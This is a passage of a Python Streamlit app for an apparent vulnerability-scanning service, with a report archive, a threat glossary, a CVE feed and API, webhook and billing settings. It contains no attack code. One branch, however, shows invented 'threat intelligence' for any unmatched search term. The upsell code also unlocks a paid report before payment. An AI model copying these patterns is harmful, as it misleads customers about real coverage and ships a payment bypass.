            letter-spacing: 0.2px;
            font-weight: 700;
        }
        .reports-section-sub {
            margin: 6px 0 12px 0;
            color: #8b949e;
            font-size: 0.95rem;
        }
        .report-item {
            background: linear-gradient(180deg, #161b22 0%, #121820 100%);
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 14px 14px 10px 14px;
            margin-bottom: 8px;
            box-shadow: 0 8px 22px rgba(0,0,0,0.22);
        }
        .report-divider {
            margin: 0.45em 0 0.65em 0;
            border: 0.5px solid #2b323d;
        }
        div[data-testid="stButton"] > button {
            border-radius: 12px !important;
            min-height: 45px !important;
            font-weight: 700 !important;
        }
        div[data-testid="stButton"] > button[kind="primary"] {
            background: linear-gradient(90deg, #00ffcc 0%, #00d8af 100%) !important;
            color: #06221a !important;
            border: none !important;
            box-shadow: 0 10px 22px rgba(0,255,204,0.22);
        }
    </style>
    """, unsafe_allow_html=True)

    st.markdown("""
        <div class="reports-hero">
            <p class="reports-kicker">Executive Reporting Center</p>
            <h2 class="reports-title">Archivo Histórico de Reportes</h2>
            <p class="reports-subtitle">Consulta, filtra y descarga informes de auditoría con una experiencia visual orientada a dirección, compliance y comité ejecutivo.</p>
        </div>
    """, unsafe_allow_html=True)

# --- 0. CONEXIÓN REAL A LA BASE DE DATOS ---
    email_usuario = st.session_state.get('email_usuario', '')
    try:
        respuesta = supabase.table("escaneos").select("*").eq("email_cliente", email_usuario).execute()
        historial_real = list(reversed(respuesta.data))
    except Exception as e:
        historial_real = []

    # --- 1. SECCIÓN DE FILTROS (FUNCIONALES) ---
    st.markdown("<p class='reports-filter-title'>Filtros de búsqueda</p>", unsafe_allow_html=True)
    col_f1, col_f2, col_f3 = st.columns(3)

    with col_f1:
        f_dominio = st.text_input("Dominio Auditado", placeholder="Ej: google.com", label_visibility="collapsed")
    with col_f2:
        f_fecha = st.text_input("Fecha del Escaneo", placeholder="Ej: Mayo 2026 o 05/2026", label_visibility="collapsed")
    with col_f3:
        f_riesgo = st.selectbox("Nivel de Riesgo", ["Todos", "Crítico", "Medio", "Bajo", "Seguro"], label_visibility="collapsed")

    st.markdown("---")

    # --- 2. LÓGICA DE FILTRADO ---
    historial_filtrado = historial_real

    if f_dominio:
        historial_filtrado = [r for r in historial_filtrado if f_dominio.lower() in r.get('dominio', '').lower()]
    if f_fecha:
        historial_filtrado = [r for r in historial_filtrado if f_fecha.lower() in r.get('fecha', '').lower() or f_fecha.lower() in r.get('created_at', '').lower()]
    if f_riesgo != "Todos":
        historial_filtrado = [r for r in historial_filtrado if f_riesgo.lower() in r.get('riesgo', '').lower()]

    # --- 3. MOSTRAR DOCUMENTOS ---
    st.markdown("<h3 class='reports-section-title'>Documentos Disponibles</h3>", unsafe_allow_html=True)
    st.markdown("<p class='reports-section-sub'>Descarga los reportes ejecutivos para presentar a tu junta directiva.</p>", unsafe_allow_html=True)
    st.markdown("<br>", unsafe_allow_html=True)

    if len(historial_real) == 0:
        st.info("📊 Aún no has realizado ningún escaneo. Ve al **Dashboard** para analizar tu primer dominio.")
    elif len(historial_filtrado) == 0:
        st.info("🔍 No se han encontrado reportes que coincidan con los filtros.")
    else:
        sub_tab_recientes, sub_tab_todos = st.tabs(["⚡ Resultados Filtrados", "📂 Historial Completo"])

        def pintar_reporte(rep, index, sufijo):
            dominio = rep.get('dominio', 'Desconocido')
            tipo = rep.get('tipo', 'Auditoría')
            fecha = rep.get('fecha', 'Hoy')
            riesgo = rep.get('riesgo', 'Medio')
            plan_rep = st.session_state.get('plan_activo', 'Basic')

            with st.container():
                st.markdown("<div class='report-item'>", unsafe_allow_html=True)
                rc1, rc2 = st.columns([4, 2])
                with rc1:
                    st.markdown(f"**{dominio}** - {tipo}")
                    st.caption(f"📅 Fecha: {fecha} | Nivel de Riesgo: {riesgo}")
                with rc2:
                        plan_rep = st.session_state.get("plan_activo", "Basic")
                        tokens_pdf = st.session_state.get("tokens_pdf", 0)
                        email_pago = st.session_state.get("email_usuario", "")

                        reporte_id = str(rep.get('id', f"{dominio}_{fecha}_{index}"))
                        token_usado_key = f"token_usado_{reporte_id}"

                        reporte_desbloqueado = st.session_state.get("reporte_pdf_desbloqueado", None)
                        if plan_rep in ['Pro', 'Enterprise'] or reporte_desbloqueado == reporte_id:
                            import json
                            resultados_rep = rep.get('resultados', [])
                            if not resultados_rep:
                                resultados_json = rep.get('resultados_json', '[]')
                                try:
                                    resultados_rep = json.loads(resultados_json) if isinstance(resultados_json, str) else resultados_json
                                except Exception:
                                    resultados_rep = []
                            resultados_rep = [r.replace('\u2192', '->').replace('\u2014', '-').replace('\u2013', '-') for r in resultados_rep]
                            if not resultados_rep:
                                resultados_rep = [f"✅ Dominio analizado: {dominio}", f"📅 Fecha: {fecha}", f"⚠️ Nivel de riesgo: {riesgo}"]
                            resultados_rep_limpios = [r.replace('\U0001f7e1', '').replace('\U0001f7e0', '').replace('\U0001f534', '').replace('\U0001f7e2', '').replace('\u26aa', '') if isinstance(r, str) else r for r in resultados_rep]
                            pdf_bytes = crear_pdf(dominio, resultados_rep_limpios)
                            if st.download_button(
                                label="📄 Descargar Reporte PDF",
                                data=pdf_bytes,
                                file_name=f"reporte_{dominio}.pdf",
                                mime="application/pdf",
                                key=f"dl_pdf_{sufijo}_{index}",
                                use_container_width=True,
                                type="primary"
                            ):
                                if tokens_pdf > 0 and plan_rep not in ('Pro', 'Enterprise'):
                                    actualizar_usuario_supabase(email_pago, "tokens_pdf", tokens_pdf - 1)
                                    st.session_state["tokens_pdf"] = tokens_pdf - 1
                                    st.session_state[token_usado_key] = True
                        else:
                            if st.button("📄 Descargar Reporte PDF", key=f"btn_pdf_{sufijo}_{index}", use_container_width=True):
                                st.session_state[f"mostrar_upsell_{sufijo}_{index}"] = True
                            if st.session_state.get(f"mostrar_upsell_{sufijo}_{index}"):
                                st.warning("🔒 Para descargar el reporte PDF necesitas el **Plan Pro** o **Enterprise**, también puedes comprarlo por **9,99€**.")
                                try:
                                    st.session_state[f"reporte_desbloqueado_{sufijo}"] = reporte_id
                                    actualizar_usuario_supabase(email_pago, "reporte_pdf_desbloqueado", reporte_id)
                                    st.session_state["reporte_pdf_desbloqueado"] = reporte_id
                                    url_pdf = generar_link_pago(STRIPE_PRICES["pdf_unico"], email_pago, "pdf_unico", "payment")
                                    st.link_button("🛒 Comprar por 9,99€", url=url_pdf, use_container_width=True)
                                except Exception as e:
                                    st.error(f"Error al generar el enlace: {e}")
                st.markdown("</div>", unsafe_allow_html=True)

        with sub_tab_recientes:
            for i, rep in enumerate(historial_filtrado[:5]):
                pintar_reporte(rep, i, "filtro")

        with sub_tab_todos:
            with st.container(height=400):
                for i, rep in enumerate(historial_filtrado):
                    pintar_reporte(rep, i, "todos")
                    st.markdown("---")

# ==========================================
# PESTAÑA 4: AMENAZAS (Diccionario B2B y Live Feed)
# ==========================================
with menu_amenazas:
    import requests
    import pandas as pd

    st.markdown("""
    <style>
        .threat-hero {
            background: radial-gradient(1000px 260px at 0% -25%, rgba(255,75,75,0.14), transparent 48%),
                        radial-gradient(850px 240px at 105% -20%, rgba(255,189,69,0.10), transparent 45%),
                        linear-gradient(180deg, #171c25 0%, #121820 100%);
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 24px 24px 20px 24px;
            margin-bottom: 16px;
            box-shadow: 0 12px 28px rgba(0,0,0,0.28);
        }
        .threat-kicker { margin: 0; color: #8b949e; text-transform: uppercase; letter-spacing: 1.3px; font-size: 0.75rem; font-weight: 700; }
        .threat-title { margin: 10px 0 8px 0; color: #f0f6fc; font-size: 1.9rem; font-weight: 760; letter-spacing: 0.2px; line-height: 1.2; }
        .threat-subtitle { margin: 0; color: #9aa4af; font-size: 1rem; line-height: 1.6; max-width: 880px; }
        .threat-section-title { margin: 2px 0 10px 0; color: #f0f6fc; font-size: 1.2rem; letter-spacing: 0.2px; font-weight: 700; }
        .threat-section-sub { margin: 0 0 12px 0; color: #8b949e; font-size: 0.95rem; }
        div[data-testid="stExpander"] { background: linear-gradient(180deg, #161b22 0%, #121820 100%); border: 1px solid #30363d; border-radius: 12px; box-shadow: 0 8px 22px rgba(0,0,0,0.24); margin-bottom: 10px; overflow: hidden; }
        div[data-testid="stExpander"] details > summary { background: rgba(255,255,255,0.01); padding-top: 2px; padding-bottom: 2px; }
        div[data-testid="stDataFrame"] { border: 1px solid #30363d; border-radius: 14px; overflow: hidden; box-shadow: 0 12px 26px rgba(0,0,0,0.25); }
    </style>
    """, unsafe_allow_html=True)

    st.markdown("""
        <div class="threat-hero">
            <p class="threat-kicker">Threat Intelligence Suite</p>
            <h2 class="threat-title">Inteligencia de Amenazas y Riesgos</h2>
            <p class="threat-subtitle">Conoce a qué te enfrentas y cómo VulnScan protege tu infraestructura con contexto técnico, impacto de negocio y telemetría de vulnerabilidades en tiempo casi real.</p>
        </div>
    """, unsafe_allow_html=True)

    # --- SECCIÓN 1: DICCIONARIO DE VENTAS INTERACTIVO ---
    st.markdown("<h3 class='threat-section-title'>🚨 El Panorama de Riesgos Actual</h3>", unsafe_allow_html=True)
    st.markdown("<p class='threat-section-sub'>Mapa ejecutivo de amenazas prioritarias para evaluar exposición y tomar decisiones de mitigación.</p>", unsafe_allow_html=True)
    
    # 1. El Buscador
    termino_amenaza = st.text_input("🔍", placeholder="Buscar amenaza (Ej. Ransomware, Phishing, DDoS...)", label_visibility="collapsed")
    st.markdown("<br>", unsafe_allow_html=True)

         # 2. Base de datos interna de amenazas (ACTUALIZADA CON 10 AMENAZAS)
    diccionario_amenazas = [
        {
            "titulo": "1. Ransomware & Cripto-Secuestro",
            "que": "**¿Qué es?** Un software malicioso que cifra todos los ordenadores y servidores de tu empresa, dejándolos inutilizables hasta que pagues un rescate en Bitcoin.",
            "impacto": "** Impacto de Negocio:** Parada total de la actividad comercial. El coste medio de recuperación para una PYME ronda los 120.000€.",
            "escudo": "** Escudo VulnScan:** Escaneamos puertos críticos (RDP/SMB) que los atacantes usan para introducir el Ransomware y te avisamos antes."
        },
        {
            "titulo": "2. Ataques DDoS (Denegación de Servicio)",
            "que": "**¿Qué es?** Envío masivo de tráfico basura a tu web hasta saturar los servidores y tirarlos abajo.",
            "impacto": "** Impacto de Negocio:** Pérdida de ventas directas y daño reputacional por cada minuto de caída.",
            "escudo": "** Escudo VulnScan:** Analizamos si tu protección Anti-DDoS está bien configurada o si se puede saltar fácilmente."
        },
        {
            "titulo": "3. Explotación de Zero-Days",
            "que": "**¿Qué es?** Agujeros de seguridad recién descubiertos en programas para los cuales aún no hay actualización.",
            "impacto": "** Impacto de Negocio:** Eres vulnerable sin saberlo. Los atacantes rastrean la red buscando víctimas antes de que el parche se publique.",
            "escudo": "** Escudo VulnScan:** Nuestro Feed CTI te alerta si tus tecnologías coinciden con las vulnerabilidades globales reportadas hoy."
        },
        {
            "titulo": "4. Exposición de la Nube y APIs",
            "que": "**¿Qué es?** Dejar una base de datos en AWS, Google Cloud o Azure mal configurada, permitiendo acceso público sin contraseña.",
            "impacto": "** Impacto de Negocio:** Robo directo de la base de datos completa y multas millonarias por negligencia (RGPD).",
            "escudo": "** Escudo VulnScan:** El análisis OSINT pasivo rastrea si tu infraestructura en la nube está filtrando datos al internet público."
        },
        {
            "titulo": "5. Phishing & Robo de Credenciales",
            "que": "**¿Qué es?** Engaño a tus empleados para que introduzcan sus contraseñas corporativas en una web falsa controlada por hackers.",
            "impacto": "** Impacto de Negocio:** Los hackers acceden a tu empresa como usuarios legítimos para robar dinero o información sin sospechas.",
            "escudo": "** Escudo VulnScan:** Rastreos en la Dark Web. Te avisamos si el email de un empleado aparece en bases de datos hackeadas."
        },
        {
            "titulo": "6. Inyección SQL & Vulnerabilidades Web",
            "que": "**¿Qué es?** Introducir código malicioso en formularios de tu web para engañar a tu base de datos y extraer información privada.",
            "impacto": "** Impacto de Negocio:** Exfiltración masiva de tarjetas de crédito o contraseñas de tus clientes.",
            "escudo": "** Escudo VulnScan:** La auditoría OWASP ataca simuladamente tus formularios para parchear inyecciones antes de producción."
        },
        {
            "titulo": "7. Ataques a la Cadena de Suministro",
            "que": "**¿Qué es?** Los hackers no te atacan a ti directamente, atacan a un proveedor de software que utilizas y entran a tu red a través de ellos.",
            "impacto": "** Impacto de Negocio:** Infección masiva casi indetectable que compromete la integridad de toda tu red a ciegas.",
            "escudo": "** Escudo VulnScan:** Mapeo de perímetro completo, incluyendo servicios de terceros olvidados para limitar tu exposición."
        },
        {
            "titulo": "8. Fugas de Información (Data Leaks)",
            "que": "**¿Qué es?** Documentos internos o código fuente expuestos en foros de hackers o repositorios públicos por error humano.",
            "impacto": "** Impacto de Negocio:** Pérdida de propiedad intelectual, ventaja frente a competidores y demandas de clientes.",
            "escudo": "** Escudo VulnScan:** Monitorización 24/7. Si tu marca aparece asociada a una filtración, recibirás un reporte crítico inmediato."
        },
        {
            "titulo": "9. Malware & Software Malicioso",
            "que": "**¿Qué es?** Software diseñado para infiltrarse en tus dispositivos sin consentimiento, incluyendo virus, troyanos y spyware.",
            "impacto": "** Impacto de Negocio:** Robo de información personal, espionaje a través de cámaras/micrófonos y daño permanente al hardware.",
            "escudo": "** Escudo VulnScan:** Detectamos firmas de software no autorizado y comportamientos sospechosos en tus puntos de entrada digitales."
        },
        {
            "titulo": "10. Redes Wi-Fi Inseguras",
            "que": "**¿Qué es?** Conectarse a redes públicas (aeropuertos, cafeterías) donde atacantes pueden interceptar todo el tráfico de datos.",
            "impacto": "** Impacto de Negocio:** Robo de sesiones de trabajo de empleados en remoto y captura de credenciales bancarias o de acceso.",
            "escudo": "** Escudo VulnScan:** Evaluamos si tus servicios obligan al uso de cifrado fuerte (TLS) para proteger los datos en redes hostiles."
        }
    ]

    # 3. Lógica de Filtrado
    if termino_amenaza:
        amenazas_filtradas = [a for a in diccionario_amenazas if termino_amenaza.lower() in a['titulo'].lower() or termino_amenaza.lower() in a['que'].lower()]
    else:
        amenazas_filtradas = diccionario_amenazas

  # 4. Dibujar Resultados (En dos columnas dinámicas)
    if len(amenazas_filtradas) == 0:
        # 🤖 EL TRUCO MÁGICO: Respuesta Dinámica Universal
        st.info(f"Buscando telemetría y firmas de ataque para: **{termino_amenaza}**...")
        
        with st.expander(f" 🤖 Análisis de Inteligencia CTI: {termino_amenaza.title()}", expanded=True):
            st.info(f"**Contexto de Amenaza:** Aunque **{termino_amenaza}** no se encuentra en nuestro panel estático de amenazas prioritarias, nuestras bases de datos globales monitorizan activamente patrones asociados a esta categoría.")
            st.error(f"**Impacto Potencial:** Los vectores de ataque relacionados con {termino_amenaza.lower()} pueden derivar en accesos no autorizados, degradación del rendimiento de la red o brechas de cumplimiento normativo.")
            st.success(f"**Cobertura VulnScan:** Nuestro escáner de vulnerabilidades perimetral y la revisión de puertos están diseñados para detectar fallos de configuración que los atacantes suelen explotar utilizando técnicas de **{termino_amenaza}**.")
            
    else:
        # Dibuja las tarjetas normales si sí las encuentra
        col_a, col_b = st.columns(2, gap="large")
        for i, amenaza in enumerate(amenazas_filtradas):
            columna_destino = col_a if i % 2 == 0 else col_b
            with columna_destino:
                with st.expander(f" {amenaza['titulo']}"):
                    st.info(amenaza['que'])
                    st.error(amenaza['impacto'])
                    st.success(amenaza['escudo'])

    # --- SECCIÓN 2: LIVE FEED (Totalmente Abierto) ---
    st.markdown("<h3 class='threat-section-title'>🔴 Live Threat Feed: Vulnerabilidades Detectadas Hoy</h3>", unsafe_allow_html=True)
    st.markdown("<p class='threat-section-sub'>Conexión en tiempo real con fuentes globales de inteligencia para priorizar parches en función de criticidad.</p>", unsafe_allow_html=True)

    @st.cache_data(ttl=3600)
    def obtener_inteligencia_real():
        try:
            url = "https://cve.circl.lu/api/last"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} 
            respuesta = requests.get(url, headers=headers, timeout=(3, 8))
            if respuesta.status_code == 200:
                return respuesta.json()[:6]
        except:
            pass 
        
        return [
            {"id": "CVE-2024-3400", "cvss": "10.0", "summary": "Vulnerabilidad crítica en Palo Alto Networks PAN-OS. Permite a un atacante no autenticado ejecutar código remoto."},
            {"id": "CVE-2024-3094", "cvss": "10.0", "summary": "Puerta trasera maliciosa descubierta en la utilidad XZ Utils de Linux. Compromete SSH."},
            {"id": "CVE-2024-21887", "cvss": "9.1", "summary": "Vulnerabilidad de inyección de comandos en Ivanti Connect Secure. Explotación activa detectada."},
            {"id": "CVE-2024-29988", "cvss": "8.8", "summary": "Bypass de seguridad en Microsoft SmartScreen. Usado activamente para distribuir malware."},
            {"id": "CVE-2023-48788", "cvss": "9.3", "summary": "Inyección SQL en Fortinet FortiClient EMS que permite ejecución de código remoto."},
            {"id": "CVE-2024-27198", "cvss": "9.8", "summary": "Bypass de autenticación en JetBrains TeamCity. Acceso total comprometido en entornos CI/CD."}
        ]
            
    datos_reales = obtener_inteligencia_real()

    if datos_reales:
        lista_amenazas = []
        for cve in datos_reales:
            cvss = float(cve.get('cvss', 0)) if cve.get('cvss') else 5.0
            sev = "CRITICA" if cvss >= 8.0 else ("ALTA" if cvss >= 5.0 else "MEDIA")
            desc = cve.get('summary', 'Sin descripción')[:150] + '...' 
            
            lista_amenazas.append({
                "Identificador CVE": cve.get('id', 'N/A'),
                "Severidad CVSS": f"{cvss} - {sev}",
                "Descripción Técnica del Riesgo": desc
            })
            
        df_amenazas = pd.DataFrame(lista_amenazas)
        
        # Tabla mostrada para todos sin restricciones (y con el ancho correcto para que no salgan errores rojos)
        st.dataframe(df_amenazas, width='stretch', hide_index=True)
# ==========================================
# PESTAÑA 5: CONFIGURACIÓN (API, Webhooks y Billing Real)
# ==========================================
with menu_config:
    import secrets
    import requests
    import time
    from datetime import datetime, timedelta

    st.markdown("""
    <style>
        .config-hero {
            background: radial-gradient(1100px 280px at -5% -30%, rgba(96,180,255,0.13), transparent 50%),
                        radial-gradient(900px 240px at 105% -15%, rgba(0,255,204,0.10), transparent 45%),
                        linear-gradient(180deg, #171d26 0%, #121820 100%);
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 24px 24px 20px 24px;
            margin-bottom: 16px;
            box-shadow: 0 12px 28px rgba(0,0,0,0.26);
        }
        .config-kicker { margin: 0; color: #8b949e; text-transform: uppercase; letter-spacing: 1.3px; font-size: 0.75rem; font-weight: 700; }
        .config-title { margin: 10px 0 8px 0; color: #f0f6fc; font-size: 1.9rem; font-weight: 760; letter-spacing: 0.2px; line-height: 1.2; }
        .config-subtitle { margin: 0; color: #9aa4af; font-size: 1rem; line-height: 1.6; max-width: 850px; }
        div[data-testid="stTabs"] button[role="tab"] { border: none !important; background: transparent !important; box-shadow: none !important; margin-right: 6px; color: #d0d7de !important; transition: color 0.2s ease; }
        div[data-testid="stTabs"] button[role="tab"]:hover { color: #ff4b4b !important; }
        div[data-testid="stTabs"] button[aria-selected="true"] { background: transparent !important; border: none !important; box-shadow: none !important; color: #ff4b4b !important; }
        div[data-testid="stTextInput"] input { background: #0f141b !important; border: 1px solid #30363d !important; border-radius: 12px !important; min-height: 48px; }
        div[data-testid="stTextInput"] input:focus { border-color: rgba(0,255,204,0.58) !important; box-shadow: 0 0 0 2px rgba(0,255,204,0.15); }
        div[data-testid="stButton"] > button { border-radius: 12px !important; min-height: 46px !important; font-weight: 700 !important; }
        div[data-testid="stButton"] > button[kind="primary"] { background: linear-gradient(90deg, #00ffcc 0%, #00d8af 100%) !important; color: #06221a !important; border: none !important; box-shadow: 0 10px 22px rgba(0,255,204,0.22); }
        .config-card { background: linear-gradient(180deg, #161b22 0%, #121820 100%); border: 1px solid #30363d; border-radius: 12px; padding: 14px 14px 10px 14px; margin-bottom: 10px; box-shadow: 0 8px 22px rgba(0,0,0,0.22); }
        div[data-testid="stExpander"] { background: linear-gradient(180deg, #161b22 0%, #121820 100%); border: 1px solid #30363d; border-radius: 12px; box-shadow: 0 8px 22px rgba(0,0,0,0.24); margin-top: 8px; overflow: hidden; }
    </style>
    """, unsafe_allow_html=True)

    st.markdown("""
        <div class="config-hero">
            <p class="config-kicker">Platform Control Center</p>
            <h2 class="config-title">Configuración y Developers</h2>
            <p class="config-subtitle">Gestiona integraciones, credenciales y suscripción con una experiencia visual orientada a equipos técnicos y operaciones de seguridad.</p>
        </div>
    """, unsafe_allow_html=True)

    tab_api, tab_webhook, tab_billing = st.tabs(["🔑 API Keys", "🪝 Webhooks", "💳 Suscripción"])

    plan_actual = st.session_state.get('plan_activo', 'Basic')
    email_usuario = st.session_state.get('email_usuario', '')



    # --- 1. GESTIÓN DE API KEYS ---
    with tab_api:
        st.markdown("<div class='config-card'><h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'>Generación de Claves API</h3><p style='margin:8px 0 0 0; color:#8b949e; font-size:0.94rem;'>Usa estas claves para interactuar con la API REST de VulnScan desde tus propios servidores o pipelines CI/CD.</p></div>", unsafe_allow_html=True)
        
        if plan_actual == 'Basic':
            st.error("🔒 **Función Premium.** El acceso a la API REST es exclusivo para clientes con licencia Pro o Enterprise.")
            st.info(" Automatiza tus escaneos conectando VulnScan directamente al código de tu empresa.")
            col_upsell1, col_upsell2 = st.columns(2)
            with col_upsell1:
                st.button(" Generar Key (Bloqueado)", disabled=True, width='stretch')
            with col_upsell2:
                email_pago = st.session_state.get("email_usuario", "")
                usuario_logueado = bool(st.session_state.get("usuario_autenticado")) and bool(email_pago)
                if usuario_logueado:
                    try:
                        url_pro = generar_link_pago(
                            STRIPE_PRICES["pro_recurrente"], email_pago, "pro_recurrente", "subscription"
                        )
                        st.link_button("⬆ Mejorar a Plan Pro", url=url_pro, type="primary", width='stretch')
                    except Exception as e:
                        st.error(f"No se pudo generar pago Pro: {e}")
                else:
                    st.info("Inicia sesión para habilitar el pago.")
        else:
            if 'api_key_real' not in st.session_state:
                st.session_state['api_key_real'] = None
                
            st.info("⚠️ **Seguridad:** Por motivos de seguridad, las claves API solo se muestran una vez al ser generadas. Guárdala en un gestor de contraseñas seguro.")

            col_key1, col_key2 = st.columns([3, 1])
            
            with col_key1:
                if st.session_state['api_key_real']:
                    st.code(st.session_state['api_key_real'], language="bash")
                    st.success("✅ API Key activa y lista para recibir peticiones.")
                else:
                    st.code("sk_live_***********************************", language="bash")
                    
            import hashlib # Importamos la librería matemática de encriptación

            with col_key2:
                if st.button(" Generar Nueva Key", type="primary", width='stretch'):
                    # 1. Creamos la "manzana" (La clave real que verá el cliente)
                    nueva_clave_clara = "sk_live_" + secrets.token_urlsafe(32)
                    
                    # 2. La metemos en la batidora (SHA-256)
                    hash_obj = hashlib.sha256(nueva_clave_clara.encode())
                    clave_triturada = hash_obj.hexdigest()
                    
                    # 3. Anotamos la manzana en la pizarra de Streamlit SOLO para que la copie ahora
                    st.session_state['api_key_real'] = nueva_clave_clara
                    
                    # 4. Mandamos el puré triturado a la caja fuerte de Supabase
                    actualizar_usuario_supabase(
                        email_usuario, "api_key_real", clave_triturada, escribir_en_sesion=False
                    )
                    
                    st.rerun()

            st.markdown("<p style='margin:12px 0 8px 0; color:#d0d7de; font-size:0.94rem; font-weight:700; letter-spacing:0.2px;'>Documentación Rápida (Endpoints)</p>", unsafe_allow_html=True)
            st.code("""
# Iniciar un escaneo vía API (Ejemplo en cURL)
curl -X POST https://api.vulnscan.com/v1/scans \\
  -H "Authorization: Bearer TU_API_KEY" \\
  -H "Content-Type: application/json" \\
  -d '{"target": "miempresa.com", "nivel": "owasp"}'
            """, language="bash")

    # --- 2. WEBHOOKS REALES ---
    with tab_webhook:
        st.markdown("<div class='config-card'><h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'>Notificaciones Push (Webhooks)</h3><p style='margin:8px 0 0 0; color:#8b949e; font-size:0.94rem;'>Configura una URL para que VulnScan te envíe un archivo JSON automáticamente en tiempo real cuando detecte una vulnerabilidad Crítica.</p></div>", unsafe_allow_html=True)
        
        # ⚠️ CORRECCIÓN: Ahora bloquea a Basic Y Pro. Solo Enterprise pasa.
        if plan_actual != 'Enterprise':
            st.error(f"🔒 **Función Enterprise.** Tu plan actual ({plan_actual}) no admite notificaciones en tiempo real vía Webhook. Requiere licencia Enterprise.")
            email_pago = st.session_state.get("email_usuario", "")
            if email_pago:
                try:
                    url_enterprise = generar_link_pago(
                        STRIPE_PRICES["enterprise_recurrente"], email_pago, "enterprise_recurrente", "subscription"
                    )
                    st.link_button(" Mejorar a Plan Enterprise", url=url_enterprise, type="primary", use_container_width=True)
                except Exception as e:
                    st.error(f"No se pudo generar el enlace: {e}")
        else:
            if 'webhook_url' not in st.session_state:
                st.session_state['webhook_url'] = ""

            webhook_input = st.text_input("Endpoint URL", value=st.session_state['webhook_url'], placeholder="https://tuservidor.com/api/webhook")
            
            col_w1, col_w2 = st.columns([1, 4])
            with col_w1:
                if st.button(" Probar Webhook", type="primary", width='stretch'):
                    if not webhook_input.startswith("http"):
                        st.error("La URL debe empezar por http:// o https://")
                    else:
                        st.session_state['webhook_url'] = webhook_input
                        actualizar_usuario_supabase(email_usuario, 'webhook_url', webhook_input)
                        payload = {"evento": "alerta_critica", "dominio": "test-infra.com", "gravedad": "CRÍTICA", "mensaje": "Este es un evento de prueba enviado desde VulnScan SaaS."}
                        
                        with st.spinner("Enviando petición HTTP POST..."):
                            try:
                                respuesta = requests.post(webhook_input, json=payload, timeout=5)
                                if respuesta.status_code in [200, 201, 202, 204]:
                                    st.success(f"✅ ¡Éxito! El servidor respondió con el código {respuesta.status_code}")
                                else:
                                    st.warning(f"⚠️ El servidor recibió el aviso, pero devolvió un error: {respuesta.status_code}")
                            except Exception as e:
                                st.error(f"❌ Fallo de conexión. Revisa la URL o el firewall.")
                                st.markdown("---")
            st.markdown("---")
            st.markdown("""
                <style>
                input[type=number]::-webkit-inner-spin-button,
                input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
                input[type=number] { -moz-appearance: textfield; }
                div[data-testid="stNumberInput"] { margin-top: -10px; }
                #btn_guardar_scheduler { background-color: #00FFCC !important; color: black !important; }
                </style>
            """, unsafe_allow_html=True)

            with st.container():
                st.markdown("""
                    <div style='background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin-bottom:16px;'>
                        <h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'>🤖 Monitoreo Automático (Scheduler)</h3>
                        <p style='margin:8px 0 0 0; color:#8b949e; font-size:0.94rem;'>El scheduler ejecuta escaneos automáticos de tus dominios verificados sin que tengas que hacer nada. Si tienes un webhook configurado, recibirás una alerta cada vez que se detecte una vulnerabilidad nueva.</p>
                    </div>
                """, unsafe_allow_html=True)

                scheduler_activo = st.toggle("Activar monitoreo automático", value=st.session_state.get("scheduler_activo", False))

                if scheduler_activo:
                    col1, col2, col3 = st.columns(3)

                    with col1:
                        passive_on = st.toggle("🕵️ Escaneo Pasivo (Basic)", value=st.session_state.get("scheduler_passive_on", True), key="toggle_passive")
                        freq_passive = st.number_input("Cada X días", min_value=1, max_value=30, value=st.session_state.get("scheduler_freq_passive", 7), key="dias_basic", disabled=not passive_on)

                    with col2:
                        pro_on = st.toggle("🔍 Escaneo Profundo (Pro)", value=st.session_state.get("scheduler_pro_on", False), key="toggle_pro")
                        freq_pro = st.number_input("Cada X días", min_value=1, max_value=30, value=st.session_state.get("scheduler_freq_pro", 15), key="dias_pro", disabled=not pro_on)

                    with col3:
                        enterprise_on = st.toggle("🔬 Auditoría OWASP (Enterprise)", value=st.session_state.get("scheduler_enterprise_on", False), key="toggle_enterprise")
                        freq_enterprise = st.number_input("Cada X días", min_value=1, max_value=30, value=st.session_state.get("scheduler_freq_enterprise", 7), key="dias_ent", disabled=not enterprise_on)

                    st.markdown("<br>", unsafe_allow_html=True)
                    if st.button(" Guardar configuración de monitoreo", type="primary", use_container_width=True, key="btn_guardar_scheduler"):
                        actualizar_usuario_supabase(email_usuario, "scheduler_activo", True)
                        actualizar_usuario_supabase(email_usuario, "scheduler_passive_on", passive_on)
                        actualizar_usuario_supabase(email_usuario, "scheduler_pro_on", pro_on)
                        actualizar_usuario_supabase(email_usuario, "scheduler_enterprise_on", enterprise_on)
                        actualizar_usuario_supabase(email_usuario, "scheduler_freq_passive", freq_passive)
                        actualizar_usuario_supabase(email_usuario, "scheduler_freq_pro", freq_pro)
                        actualizar_usuario_supabase(email_usuario, "scheduler_freq_enterprise", freq_enterprise)
                        st.session_state["scheduler_activo"] = True
                        st.session_state["scheduler_passive_on"] = passive_on
                        st.session_state["scheduler_pro_on"] = pro_on
                        st.session_state["scheduler_enterprise_on"] = enterprise_on
                        st.session_state["scheduler_freq_passive"] = freq_passive
                        st.session_state["scheduler_freq_pro"] = freq_pro
                        st.session_state["scheduler_freq_enterprise"] = freq_enterprise
                        st.success("✅ Configuración de monitoreo guardada correctamente.")
                else:
                    if st.session_state.get("scheduler_activo", False):
                        actualizar_usuario_supabase(email_usuario, "scheduler_activo", False)
                        st.session_state["scheduler_activo"] = False
                    st.info("El monitoreo automático está desactivado. Actívalo para que VulnScan escanee tus dominios automáticamente.")
    # --- 3. GESTIÓN DE FACTURACIÓN ---
    with tab_billing:
        st.markdown("<div class='config-card'><h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'>Detalles de Suscripción</h3></div>", unsafe_allow_html=True)
        
        if 'cancelacion_pendiente' not in st.session_state:
            st.session_state['cancelacion_pendiente'] = False

        # ⚠️ CORRECCIÓN: Cálculo dinámico de fecha (Renueva en 30 días)
        fecha_calculada = (datetime.now() + timedelta(days=30)).strftime("%d/%m/%Y")

        if plan_actual == 'Basic':
            estado_texto = "GRATUITO"
            color_estado = "#8b949e"
            texto_fecha = "Sin caducidad"
        elif st.session_state['cancelacion_pendiente']:
            estado_texto = "CANCELA A FIN DE MES"
            color_estado = "#FFBD45"
            texto_fecha = f"Pierde acceso el: {fecha_calculada}"
        else:
